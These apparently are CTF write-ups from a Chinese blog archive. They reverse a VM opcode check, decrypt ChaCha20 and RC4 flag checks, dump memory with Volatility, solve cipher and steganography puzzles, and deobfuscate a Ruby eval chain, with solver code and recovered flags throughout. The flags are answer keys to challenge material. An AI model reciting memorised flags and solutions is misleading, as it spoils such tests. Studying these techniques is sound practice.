flag的长度为15位，再观察opcode，可以发现是一位一位进行处理，经过一种运算然后0x8暂存，然后再经过一种计算将结果写入最终target，所以可以有两种解法，可以一位一位的逆flag，也可以逆vm的指令 逐位计算flag 1234567891011121314151617181920target = [0x22, 0x3F, 0x34, 0x32, 0x72, 0x33, 0x18, 0xA7, 0x31, 0xF1, 0x28, 0x84, 0xC1, 0x1E, 0x7A]flag = \"\"flag += chr((target[0] + 5) ^ 0x10)flag += chr((target[1] // 3) ^ 0x20)flag += chr((target[2] + 1) + 2)flag += chr((target[3] - 1) ^ 4)flag += chr((target[4] + 0x21)//3)flag += chr(target[5] + 2)flag += chr((target[6] + 0x20) ^ 0x9)flag += chr((target[7] ^ 0x24) - 0x51)flag += chr(target[8])flag += chr((target[9] - 0x25) // 2)flag += chr((target[10] ^ 0x41) - 0x36)flag += chr(target[11] - 0x20)flag += chr((target[12] - 0x25) // 3)flag += chr((target[13] + 0x20) ^ 9)flag += chr((target[14] - 1) - 0x41)print(flag)# 757515121f3d478 调整vm指令 把每一个运算改成逆运算，然后将每一位的两次计算交换顺序 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175#include &lt;iostream&gt;#include \"ida.h\"using namespace std;int __cdecl vm_operad(unsigned int *opcode, int len) { int result; // eax unsigned int input[100] = {0x22, 0x3F, 0x34, 0x32, 0x72, 0x33, 0x18, 0xA7, 0x31, 0xF1, 0x28, 0x84, 0xC1, 0x1E, 0x7A}; // [esp+13h] [ebp-E5h] char v4[100] = {0}; // [esp+77h] [ebp-81h] string flag; unsigned char v5; // [esp+DBh] [ebp-1Dh] int v6; // [esp+DCh] [ebp-1Ch] int v7; // [esp+E0h] [ebp-18h] int v8; // [esp+E4h] [ebp-14h] int v9; // [esp+E8h] [ebp-10h] int opcode_index; // [esp+ECh] [ebp-Ch] opcode_index = 0; v9 = 0; v8 = 0; v7 = 0; v6 = 0; while (true) { result = opcode_index; if (opcode_index &gt;= len) { cout &lt;&lt; flag &lt;&lt; endl; return result; } switch (opcode[opcode_index]) { case 1: flag += v5; ++opcode_index; ++v7; ++v9; break; case 2: v5 = input[v9] - opcode[opcode_index + 1]; opcode_index += 2; break; case 3: v5 = input[v9] + LOBYTE(opcode[opcode_index + 1]); opcode_index += 2; break; case 4: v5 = opcode[opcode_index + 1] ^ input[v9]; opcode_index += 2; break; case 5: v5 = input[v9] / opcode[opcode_index + 1]; opcode_index += 2; break; case 6: ++opcode_index; break; case 7: ++v8; opcode_index += 2; break; case 8: input[v6] = v5; ++opcode_index; ++v6; break; case 10:// read(input); ++opcode_index; break; case 11: v5 = input[v9] + 1; ++opcode_index; break; case 12: v5 = input[v9] - 1; ++opcode_index; break; default: continue; } }}unsigned int opcodes[114] = { 0x0000000A, 0x00000003, 0x00000005, 0x00000008, 0x00000004, 0x00000010, 0x00000001, 0x00000005, 0x00000003, 0x00000008, 0x00000004, 0x00000020, 0x00000001, 0x0000000B, 0x00000008, 0x00000003, 0x00000002, 0x00000001, 0x00000004, 0x00000004, 0x00000008, 0x0000000C, 0x00000001, 0x00000003, 0x00000021, 0x00000008, 0x00000005, 0x00000003, 0x00000001, 0x0000000B, 0x00000008, 0x0000000B, 0x00000001, 0x00000003, 0x00000020, 0x00000008, 0x00000004, 0x00000009, 0x00000001, 0x00000004, 0x00000024, 0x00000008, 0x00000002, 0x00000051, 0x00000001, 0x0000000B, 0x00000008, 0x0000000C, 0x00000001, 0x00000002, 0x00000025, 0x00000008, 0x00000005, 0x00000002, 0x00000001, 0x00000004, 0x00000041, 0x00000008, 0x00000002, 0x00000036, 0x00000001, 0x00000005, 0x00000001, 0x00000008, 0x00000002, 0x00000020, 0x00000001, 0x00000002, 0x00000025, 0x00000008, 0x00000005, 0x00000003, 0x00000001, 0x00000003, 0x00000020, 0x00000008, 0x00000004, 0x00000009, 0x00000001, 0x0000000C, 0x00000008, 0x00000002, 0x00000041, 0x00000001, 0x00000007, 0x00000022, 0x00000007, 0x0000003F, 0x00000007, 0x00000034, 0x00000007, 0x00000032, 0x00000007, 0x00000072, 0x00000007, 0x00000033, 0x00000007, 0x00000018, 0x00000007, 0xFFFFFFA7, 0x00000007, 0x00000031, 0x00000007, 0xFFFFFFF1, 0x00000007, 0x00000028, 0x00000007, 0xFFFFFF84, 0x00000007, 0xFFFFFFC1, 0x00000007, 0x0000001E, 0x00000007, 0x0000007A};int main() { vm_operad(opcodes, 114);}// 757515121f3d478","link":"/2020/03/21/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF/"},{"title":"2021年“春秋杯”新年欢乐赛","text":"这次的赛制是第一次见到的沙漏赛制，对我这种不急不忙佛系做题的不是很友好，最后的名次也还行，前排观赏前面的神仙打架 签到程序是python打包出来的，解包找到主程序checkin，补上pyc头文件，反编译得到python代码 12345678910111213141516171819202122232425262728293031323334353637383940414243import cv2, re, sysfrom aip import AipOcrfrom apii import APP_ID, API_KEY, SECRECT_KEY, flagclient = AipOcr(APP_ID, API_KEY, SECRECT_KEY)cap = cv2.VideoCapture(0)i = 0x = 1print('\\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\\n⠀⠀⠀⠀⠀⠀⣀⣄⣀⢀⣀⣀⡀⠀⠀⠀⢀⣄⣀⣀⣀⣀⡀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⡤⠀⠀⠀⠀⠀⠀⠀⠀\\n⠀⠀⠀⠀⠀⢀⣹⣉⣝⢸⡇⠀⠀⠀⠀⢀⡞⠉⠉⣹⠉⠉⠁⠀⠀⢠⢼⢦⠐⢺⠓⢲⠀⠀⠀⠀⣾⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\\n⠀⠀⠀⠀⠀⠀⡤⣤⠤⢸⡏⢹⠉⠀⠀⠀⢸⡏⠉⢹⠉⠉⠁⠀⠀⠘⢸⠠⠤⢼⡤⠼⠤⠀⠀⠀⠛⡒⠒⡗⢒⠒⠂⠀⠀⠀⠀⠀⠀⠀\\n⠀⠀⠀⠀⠀⢀⠇⠀⠰⣸⠀⢸⠀⠀⠀⠈⠉⠉⠉⢻⠉⠉⠉⠀⠀⠀⢸⠀⣠⠏⠱⣄⠀⠀⠀⢀⡴⠁⠀⡇⠈⠳⡄⠀⠀⠀⠀⠀⠀⠀\\n⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠘⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠘⠘⠁⠀⠀⠈⠃⠀⠀⠈⠀⠈⠉⠁⠀⠀⠀⠀⠀\\n')while True: ret, frame = cap.read() cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY) cv2.imshow('capture', frame) cv2.imwrite('.\\\\i' + str(i) + '.png', frame) i = i + 1 if i - 1 &gt; x: z = open('.\\\\i' + str(x) + '.png', 'rb') img = z.read() message = client.basicGeneral(img) for j in message.get('words_result'): words = message['words_result'] num_list = [] for s in words: num_list.append(s['words']) final = num_list final = ''.join(final) if 'FUN' in final: print(flag) f = open('flag.txt', 'w', encoding='utf-8') f.write(flag) f.close() sys.exit(0) else: print('识别失败') sys.exit(0) else: x = x + 1 if cv2.waitKey(1) &amp; 255 == ord('q'): breakcap.release()cv2.destroyAllWindows() 看了一下代码，有OCR，发现真的和题目描述一样对着电脑摄像头扫“FUN”就可以了，然后放弃继续逆向写了个大大的FUN扫出来得到flagflag{ju5t_f0r_FUN} evilMem拿到vmem文件先用volatility查一下imageinfo Win7SP1x86 然后查一下进程列表 1vol.py -f image.vmem --profile=Win7SP1x86 pslist 发现进程 10x858e1030 EvilImage.exe 1884 3516 1 7 1 0 2021-01-17 16:33:41 UTC+0000 把进程内存dump出来 1vol.py -f image.vmem --profile=Win7SP1x86 memdump -p 1884 -D evilimage/ dump出来的内存用foremost恢复一下，恢复出来的文件太多，大多是系统进程，没什么太大的研究价值，根据时间找到两个可疑文件 1228: 00000608.exe 16 KB 311296 01/17/2021 16:28:1929: 00000672.dll 13 KB 344064 01/17/2021 16:28:19 修复一下程序segment的raw offset，反编译一下，发现exe文件时主程序EvilImage.exe，dll文件是调用的evil.dll 没有修复IAT，但是并不影响理解程序，这里没有太多的内容，只是调用一下Evil.dll里面的checkflag函数判断一下输入的flag是否正确就可以了 加密过程中出现了很明显的特征“expand 32-byte k”，很容易判断出来是chacha20，v8-v14进行密钥初始化，iv经过if判断条件的计算也可以很轻松地算出来，最后的加密结果也在内存中可以直接读取，解这个密码没有什么难度 1234567891011121314151617181920212223import binasciifrom Crypto.Cipher import ChaCha20import structkeys = [0xAA0F37A3, 0x214FF178, 0x6FF0CC56, 0x4B65E511, 0x2F60906D, 0xCA638692, 0xA001E464, 0x2BE81780]key = b''for i in keys: key += struct.pack('&lt;I', i)secret = keyiv = struct.pack('&lt;I', 0x6E7568D7 - 0x74) + struct.pack('&lt;I', (0x217569D6 - 0x65))print(iv)msg = 'EE2AC08F12AF33C5D1133E75C88AADBC3D0200246522037E72623311FC838FB6'msg = binascii.unhexlify(msg)msg_nonce = ivciphertext = msgcipher = ChaCha20.new(key=secret, nonce=msg_nonce)plaintext = cipher.decrypt(ciphertext)print(plaintext)# b'chunqiu!'# b'flag{R3im@aging_1ndir3ctly_LoL}\\x00' 十二宫的挑衅密码本身有点难度，但是因为和zodiac密码的解码方法完全相同，所以只要照着步骤做就很容易解出来 先对密文进行一个简单的换位 123456789101112131415161718192021s = '''^#@$@#()/&gt;@?==%1(!)&gt;(*+3&lt;#86@-7$^.4&amp;)8%#5&amp;6!=%1#$-$+5&amp;?#!.03!%=@=1010?(*~#??.+)%&amp;.7^8=1%*^=$5$7@@8&gt;&amp;*99@0185(+7)&lt;%3#@^4&amp;@@&lt;.)$3*#%%&lt;&lt;*++.@.?=~**+!==65^@&amp;'''a = s.split('\\n')# print(a)i = 0j = 0cc = []for z in range(9 * 17): cc.append(a[j % 9][i % 17]) if (z + 1) % 17 == 0: cc.append('\\n') i += 2 j += 1print(\"\".join(cc)) 然后放到AZdecrypt里面跑一下就出来了 12345IKILLED A LOT OF PEOPLE AND THE PEOPLE I KILLED WILL BECOME SLAVES TO SERVE ME THIS IS FLAG WUUHUU TAKE OFF I HOPE YOU CAN DECRYPT IT AS SOON AS POSSIBLE OR I WILL CONTINUE TO COMMIT THE CRIME 就是flag确实不太好认 snowww盲水印，binwalk跑出结果有一个matlab脚本，在这里找到讲解和提取水印的脚本 1234567891011121314151617181920212223242526272829clc;clear;close all;alpha = 1;im = double(imread('original.jpg'))/255;FA=fft2(im);ori=double(imread('attack.jpg'))/255;FB=fft2(ori);imsize = size(im);load('encode.mat');FAO=ifft2(FB);RI = FAO-double(im);xl = 1:imsize(2);yl = 1:imsize(1);[xx,yy] = meshgrid(xl,yl);FA2=fft2(FAO);G=(FA2-FA)/alpha;GG=G;for i=1:imsize(1)*0.5 for j=1:imsize(2) GG(M(i),N(j),:)=G(i,j,:); endendfor i=1:imsize(1)*0.5 for j=1:imsize(2) GG(imsize(1)+1-i,imsize(2)+1-j,:)=GG(i,j,:); endendfigure,imshow(GG);title('extracted watermark'); 跑出结果 我当时以为这已经是对我眼睛最大的考验了 SuperBrain似乎是一个开发板的程序，进行一系列初始化之后运行主程序 首先会进行通信，接收地图数据和答案数据 可以看到一共接收了36组地图和36个答案，然后执行程序判断答案是否正确 每次执行传入一个地图和对应的答案 执行的程序主要算法如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071answer = (char)answer;LABEL_10: line = &amp;map[7 * answer + 1]; while ( index &lt; 7 &amp;&amp; answer &gt;= 0 &amp;&amp; answer &lt; 7 ) { addr = &amp;line[index]; ele = line[index]; if ( answer % 2 ) { if ( line[index] ) { if ( ele == 1 ) { *addr = 0; v8 = 0; --answer; goto LABEL_10; } if ( ele != 2 ) { if ( ele != 3 ) return v8 == 1; *addr = 2; v8 = 2; ++answer; goto LABEL_10; } *addr = 1; v8 = 1; if ( ++index &gt;= 0 ) goto LABEL_10; } else { *addr = 3; v8 = 3; if ( --index &gt;= 0 ) goto LABEL_10; } return v8 == 1; } if ( line[index] ) { if ( ele == 1 ) { *addr = 2; v8 = 2; ++answer; goto LABEL_10; } if ( ele != 2 ) { if ( ele != 3 ) return v8 == 1; *addr = 0; v8 = 0; --answer; goto LABEL_10; } *addr = 3; v8 = 3; if ( --index &gt;= 0 ) goto LABEL_10; return v8 == 1; } *addr = 1; v8 = 1; if ( ++index &lt; 0 ) return v8 == 1; } return v8 == 1; 可以看到类似于走迷宫的算法，分奇偶行执行不同的操作，然后发现答案只传入0-6这7种数字，直接遍历就可以跑出答案 最后一部分输出flag，需要一些数据在内存里都找的到 很容易可以解出来 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164#include &lt;iostream&gt;int runGame(char (*gamemap)[7], uint8_t startPoint) { char answer; // r18 int v8; // r17 int v9; // r6 int index; // r19 char *v11; // r5 char *v12; // r4 char *v13; // r4 char *v14; // r5 char *line; // r20 char *addr; // r3 int ele; // r6 char map[61]; // [sp+7h] [-79h] BYREF index = 0; answer = startPoint; v8 = -1; v9 = 0; do { v11 = &amp;map[7 * v9]; v12 = &amp;(*gamemap)[7 * v9 - 1]; do { *++v11 = *++v12; ++index; } while (((index - 7) &amp; 1) != 0); for (; index &lt; 7; index += 2) { v13 = v12 + 1; v14 = v11 + 1; *v14 = *v13; v12 = v13 + 1; v11 = v14 + 1; *v11 = *v12; } ++v9; index = 0; } while (v9 &lt; 7); answer = (char) answer; LABEL_10: line = &amp;map[7 * answer + 1]; while (index &lt; 7 &amp;&amp; answer &gt;= 0 &amp;&amp; answer &lt; 7) { addr = &amp;line[index]; ele = line[index]; if (answer % 2) { if (line[index]) { if (ele == 1) { *addr = 0; v8 = 0; --answer; goto LABEL_10; } if (ele != 2) { if (ele != 3) return v8 == 1; *addr = 2; v8 = 2; ++answer; goto LABEL_10; } *addr = 1; v8 = 1; if (++index &gt;= 0) goto LABEL_10; } else { *addr = 3; v8 = 3; if (--index &gt;= 0) goto LABEL_10; } return v8 == 1; } if (line[index]) { if (ele == 1) { *addr = 2; v8 = 2; ++answer; goto LABEL_10; } if (ele != 2) { if (ele != 3) return v8 == 1; *addr = 0; v8 = 0; --answer; goto LABEL_10; } *addr = 3; v8 = 3; if (--index &gt;= 0) goto LABEL_10; return v8 == 1; } *addr = 1; v8 = 1; if (++index &lt; 0) return v8 == 1; } return v8 == 1;}int main() { char gameMap[36][11][7] = {{ {1, 0, 0, 0, 0, 0, 0,}, {3, 0, 2, 2, 3, 1, 3,}, {1, 3, 2, 1, 2, 2, 1,}, {3, 2, 3, 1, 0, 1, 0,}, {3, 3, 0, 1, 2, 1, 0,}, {0, 3, 2, 2, 2, 1, 3,}, {2, 2, 2, 2, 1, 2, 3,}, }, { {0, 0, 0, 0, 0, 1, 0,}, {0, 2, 2, 2, 1, 1, 1,}, {0, 2, 3, 2, 2, 0, 1,}, {0, 3, 1, 0, 2, 0, 1,}, {0, 0, 2, 1, 3, 1, 1,}, {3, 0, 1, 2, 2, 0, 2,}, {3, 3, 3, 0, 2, 3, 3,}, }, …………………………………… { {3, 3, 1, 3, 3, 0, 2,}, {1, 2, 1, 3, 0, 2, 3,}, {0, 1, 2, 3, 1, 1, 2,}, {2, 1, 0, 3, 0, 2, 1,}, {3, 3, 0, 2, 3, 1, 2,}, {2, 2, 3, 3, 2, 3, 1,}, {3, 2, 2, 3, 0, 2, 3,}, }, { {1, 0, 2, 0, 2, 3, 0,}, {2, 1, 3, 0, 0, 3, 0,}, {2, 3, 0, 0, 1, 2, 0,}, {3, 3, 0, 2, 0, 1, 1,}, {3, 0, 3, 2, 1, 2, 0,}, {0, 3, 2, 1, 0, 2, 2,}, {2, 3, 2, 2, 2, 0, 1,}, }, }; int res[36]; for (int i = 0; i &lt; 36; i++) { for (int j = 0; j &lt; 7; j++) { if (runGame(gameMap[i], j)) { res[i] = j; break; } } } std::string charDic = \"0123456789abcdef-\"; int base[] = {0x17, 0x06, 0x0A, 0x20, 0x2D, 0x0B, 0x39, 0x01, 0x0A, 0x10, 0x5E, 0x01, 0x1A, 0x0F, 0x51, 0x59, 0x06, 0x1F, 0x0E, 0x09, 0x23, 0x47, 0x03, 0x0A, 0x38, 0x05, 0x48, 0x23, 0x02, 0x0A, 0x12, 0x33, 0x1D, 0x1F, 0x48, 0x15}; std::cout &lt;&lt; \"flag{\"; for (int i = 0; i &lt; 36; i++) std::cout &lt;&lt; charDic[(res[i] + base[i]) % 17]; std::cout &lt;&lt; \"}\" &lt;&lt; std::endl; return 0;}//flag{ace40f94-1b3d-d97f-f256-bb726e611fa7} puzzle每个碎片都加了噪声，还有很多碎片有很大部分重复内容，就算是拼出来图片也看不清楚是什么字符…… 但是又太菜了写不出脚本识别，就只能手动拼图+ps识图 1flag{w9w45my6x8kk4e8gp9nqm6j2c154wad49} 2019-nCoV有三个文件，mp3，wav和一个压缩包，然后题目新增了一个hint，很容易看出来base32编码 123456http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.htmlhttps://www.ncbi.nlm.nih.gov/orffinder/http://www.merrybio.com.cn/blog/coronavirus-introduction.htmlPlease notice The largest structural proteinthe password is the md5(it's gene sequence) and do not let the ‘\\n’ in md5() 给的文章有新冠病毒的介绍和基因查询页面，根据提示要算S蛋白质的基因序列的md5得到密码，这个密码是mp3隐写的密码，用MP3Stego解出来又一个密码“2019-nCoV”，试了一下是压缩包密码 1234m = hashlib.md5()m.update(\"MFLLTTKRTMFVFLVLLPLVSSQCVNLTTRTQLPPAYTNSFTRGVYYPDKVFRSSVLHSTQDLFLPFFSNVTWFHAIHVSGTNGTKRFDNPVLPFNDGVYFASTEKSNIIRGWIFGTTLDSKTQSLLIVNNATNVVIKVCEFQFCNDPFLGVYYHKNNKSWMESEFRVYSSANNCTFEYVSQPFLMDLEGKQGNFKNLREFVFKNIDGYFKIYSKHTPINLVRDLPQGFSALEPLVDLPIGINITRFQTLLALHRSYLTPGDSSSGWTAGAAAYYVGYLQPRTFLLKYNENGTITDAVDCALDPLSETKCTLKSFTVEKGIYQTSNFRVQPTESIVRFPNITNLCPFGEVFNATRFASVYAWNRKRISNCVADYSVLYNSASFSTFKCYGVSPTKLNDLCFTNVYADSFVIRGDEVRQIAPGQTGKIADYNYKLPDDFTGCVIAWNSNNLDSKVGGNYNYLYRLFRKSNLKPFERDISTEIYQAGSTPCNGVEGFNCYFPLQSYGFQPTNGVGYQPYRVVVLSFELLHAPATVCGPKKSTNLVKNKCVNFNFNGLTGTGVLTESNKKFLPFQQFGRDIADTTDAVRDPQTLEILDITPCSFGGVSVITPGTNTSNQVAVLYQDVNCTEVPVAIHADQLTPTWRVYSTGSNVFQTRAGCLIGAEHVNNSYECDIPIGAGICASYQTQTNSPRRARSVASQSIIAYTMSLGAENSVAYSNNSIAIPTNFTISVTTEILPVSMTKTSVDCTMYICGDSTECSNLLLQYGSFCTQLNRALTGIAVEQDKNTQEVFAQVKQIYKTPPIKDFGGFNFSQILPDPSKPSKRSFIEDLLFNKVTLADAGFIKQYGDCLGDIAARDLICAQKFNGLTVLPPLLTDEMIAQYTSALLAGTITSGWTFGAGAALQIPFAMQMAYRFNGIGVTQNVLYENQKLIANQFNSAIGKIQDSLSSTASALGKLQDVVNQNAQALNTLVKQLSSNFGAISSVLNDILSRLDKVEAEVQIDRLITGRLQSLQTYVTQQLIRAAEIRASANLAATKMSECVLGQSKRVDFCGKGYHLMSFPQSAPHGVVFLHVTYVPAQEKNFTTAPAICHDGKAHFPREGVFVSNGTHWFVTQRNFYEPQIITTDNTFVSGNCDVVIGIVNNTVYDPLQPELDSFKEELDKYFKNHTSPDVDLGDISGINASVVNIQKEIDRLNEVAKNLNESLIDLQELGKYEQYIKWPWYIWLGFIAGLIAIVMVTIMLCCMTSCCSCLKGCCSCGSCCKFDEDDSEPVLKGVKLHYT\".encode())print(m.hexdigest())# 98eb1b1760bcc837934c8695a1cee923 wav是lsb隐写，直接用SilentEye解码得到一串没什么意义的字符“priebeijoarkjpxmdkucxwdus” 压缩包得到一张图片和hint2 hint2 16进制转ascii码得到第二个提示 1234you must pay attention to N protein ,How do that get into the viral capsid?do you know steghide?the password is encrypt by VigenÃ¨re Cipherthe screct key is The top 20 characters with the most occurrences are counted+COMBAT' 图片应该是用steghide做的隐写，隐写的密码是刚刚wav隐写得到的字符经过维吉尼亚密码解码之后的结果，但是维吉尼亚密码的密钥就跟第一句不明不白的话有关系，卡了很久，后来仔细看一下文章，有这么一句话 1核衣壳蛋白（nucleoprotein，N）位于囊膜内部，呈螺旋状，包裹着病毒单股正链的RNA基因组。病毒在进行装配时，N蛋白先和病毒RNA相互作用形成复合体形式，然后再结合M蛋白、E蛋白，最后被包装进入病毒衣壳内。 猜测是对N蛋白质、M蛋白质、E蛋白质的基因序列进行词频统计 123456789101112dic = {}N=\"MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTASWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGKMKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRNPANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPGSSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKSAAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKHWPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQVILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADLDDFSKQLQQSMSSADSTQAMFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYSQLDEEQPMEIDMADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIKLIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASFRLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLRIAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYRIGNYKLNTDHSSSSDNIALLVQ\"for word in N: if word not in dic: dic[word] = 1 else: dic[word] = dic[word] + 1swd = sorted(dic.items(), key=lambda asd: asd[1], reverse=True)print(swd)# LGASTRIQKNDPFEVYMWHC 一共20个字符按照频次从高到低的顺序排列，在后面添加COMBAT得到密钥LGASTRIQKNDPFEVYMWHCCOMBAT 解维吉尼亚密码得到隐写的密码eliminatenovelcoronavirts 用steghide解出flag 1flag{we_will_over_come_SARS-COV}","link":"/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"},{"title":"2021 ciscn Re部分wp","text":"2021 ciscn Re部分wp glassjava层没什么多余的调用，直接native调用checkflag 1234567891011121314151617bool __fastcall Java_com_ciscn_glass_MainActivity_checkFlag(int a1, int a2, int a3){ char *v3; // r4 int v4; // r5 char v6[256]; // [sp+0h] [bp-220h] BYREF char v7[260]; // [sp+100h] [bp-120h] BYREF v3 = (char *)sub_F0C(a1, a3); if ( strlen(v3) != 39 ) return 0; memset(v7, 0, 0x100u); qmemcpy(v6, \"12345678\", sizeof(v6)); v4 = strlen(v6); sub_FFC((int)v7, (int)v6, v4); sub_1088((int)v7, v3, 39); sub_10D4((int)v3, 39, (int)v6, v4); return memcmp(v3, &amp;unk_497C, 0x27u) == 0;} 长度检查，密钥拷贝，进行三步操作之后和已知结果比较，前两个显然是进行rc4加密，最后一个函数三个一组，相互异或，最后再逐位和密钥异或，逆运算即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748target = [0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 0x05, 0x02, 0x1F, 0x8E, 0x36,0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F, 0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F]def sub_10D4(ss,&nbsp; a2,&nbsp; a3,&nbsp; a4): result = [] for i in ss: result.append(i) for j in range(a2): result[j] ^= a3[j % a4] for i in range(0, a2, 3): result[i+1] ^= result[i] result[i+2] ^= result[i+1] result[i] ^= result[i+2] return resultdef Rc4_init(S, K): j = 0 k = [] for i in range(256): S.append(i) k.append(K[i % len(K)]) for i in range(256): j = (j + S[i] + ord(k[i])) % 256 S[i], S[j] = S[j], S[i]def rc4_Decrypt(S, D): i = j = 0 result = '' for a in D: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(a ^ S[(S[i] + S[j]) % 256]) result += k return resultkey = '12345678's = []Rc4_init(s, key)k0 = [49, 50, 51, 52, 53, 54, 55, 56]c = sub_10D4(target, 39, k0, 8)print(c)z = rc4_Decrypt(s, c)print(\"Decrypt:\"+z)# CISCN{6654d84617f627c88846c172e0f4d46c} little_evil程序本身解压squashfs，得到里面ruby环境和需要执行的rb代码，binwalk跑一下解压出来，得到一个混淆过后的ruby代码 1$l1Il=\"\";$l1lI=\"\";def llIl()$lI1lll=$lI1lll|7;end;def l1lll()$lI1lll=10;end;def llI1l()$lI1lll=$lI1lll|4;end;def lIlI()$lI1lll=$lI1lll+3;end;def l111()$lI1lll=$lI1lll%3;end;def lI1IlI()$lI1lll=$lI1lll|3;end;def ll1l1()$lI1lll=$lI1lll*8;end;def l1lI()$lI1lll=$lI1lll-3;end;def lI1lII()$lI1lll=$lI1lll%1;end;def lIlIl()$lI1lll=$lI1lll&amp;10;end;def lIll()$lI1lll=$lI1lll-4;end;def lII1()$lI1lll=$lI1lll%2;end;def l1III()$lI1lll=$lI1lll|1;end;def l1l111()$lI1lll=$lI1lll|5;end;def l1IIII()$lI1lll=$lI1lll%10;end;def l11I()$l1Il=$l1Il+$lI1lll.chr;end;def lIlll()$lI1lll=$lI1lll*9;end;def l11IlI()$lI1lll=$lI1lll-8;end;def lI1I1()$lI1lll=$lI1lll+5;end;def ll11lI()$lI1lll=$lI1lll&amp;9;end;def lII1l1()send($l1Il[0,4], $l1Il[4,$l1Il.length]);end;l1lll;lIlI;ll1l1;l1lI;l11I;l1lll;llI1l;lIlll;l11IlI;l11I;l1lll;lIlll;llI1l;lIlI;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llI1l;l1IIII;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI... 发现进行了许多赋值和字符串拼接，没有输入输出等操作，因此将send改为puts输出最终结果，可以看到使用eval执行了另一段代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566$llll=\"\";$llII=\"\";def&nbsp;l1llI()$l1lI1l=$l1lI1l|7;end;def&nbsp;ll1III()$l1lI1l=$l1lI1l%7;end;def&nbsp;lllI()$l1lI1l=$l1lI1l/4;end;def&nbsp;lIl1l()$l1lI1l=$l1lI1l-3;end;def&nbsp;l1lll()$l1lI1l=$l1lI1l|10;end;def&nbsp;l11I1I()$l1lI1l=10;end;def&nbsp;l1l1()$l1lI1l=$l1lI1l&amp;7;end;def&nbsp;l1II()$l1lI1l=$l1lI1l%8;end;def&nbsp;ll1I()$l1lI1l=$l1lI1l|8;end;def&nbsp;ll11()$l1lI1l=$l1lI1l^6;end;def&nbsp;ll1l1I()$l1lI1l=$l1lI1l|1;end;def&nbsp;lI1Il()$l1lI1l=$l1lI1l|3;end;def&nbsp;llI1I()$l1lI1l=$l1lI1l+6;end;def&nbsp;llIl1()$l1lI1l=$l1lI1l*4;end;def&nbsp;lI1ll()$l1lI1l=$l1lI1l*5;end;def&nbsp;l1111()$l1lI1l=$l1lI1l^7;end;def&nbsp;l1lII()$l1lI1l=$l1lI1l^4;end;def&nbsp;lIIl()$l1lI1l=$l1lI1l%5;end;def&nbsp;lII11()$l1lI1l=$l1lI1l+9;end;def&nbsp;lI11I()$llll=$llll+$l1lI1l.chr;end;def&nbsp;l1IlI()puts($llll[0,4],&nbsp;$llll[4,$llll.length]);end;l11I1I;lII11;lI1ll;llI1I;lI11I;... 同样的方法改成puts之后输出 